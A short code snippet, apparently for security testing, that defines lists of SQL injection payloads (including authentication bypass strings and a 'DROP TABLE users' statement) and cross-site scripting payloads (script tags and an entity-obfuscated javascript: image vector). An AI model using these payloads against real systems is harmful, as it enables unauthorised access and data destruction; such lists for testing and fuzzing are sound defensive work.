SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 -- ",
    "\" OR \"1\"=\"1",
    "'; DROP TABLE users; --"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "<IMG SRC=j&#X41vascript:alert('XSS')>",
]